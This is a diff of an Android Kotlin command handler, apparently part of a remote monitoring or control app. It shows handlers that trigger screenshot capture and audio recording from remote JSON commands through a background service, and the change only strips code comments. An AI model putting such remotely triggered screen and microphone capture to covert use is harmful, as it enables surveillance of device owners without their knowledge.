@@ -186,14 +186,12 @@ class Commands(private val context: Context) {
         try {
             val commandId = command.optString("id")
 
-            // Send initial response that we're processing the command
             val result = JSONObject().apply {
                 put("message", "Screenshot capture initiated")
                 put("status", "pending")
             }
             sendCommandResponse(commandId, true, "Screenshot requested", result)
 
-            // Send intent to BackgroundSyncService to actually take the screenshot
             val intent = android.content.Intent(context, BackgroundSyncService::class.java)
             intent.action = "CAPTURE_SCREENSHOT"
             intent.putExtra("command_id", commandId)
@@ -241,7 +239,7 @@ class Commands(private val context: Context) {
     private fun handleCaptureAudioCommand(command: JSONObject) {
         try {
             val commandId = command.optString("id")
-            val duration = command.optInt("duration", 30) // Default 30 seconds
+            val duration = command.optInt("duration", 30)
 
             val result = JSONObject().apply {
                 put("message", "Audio recording initiated")
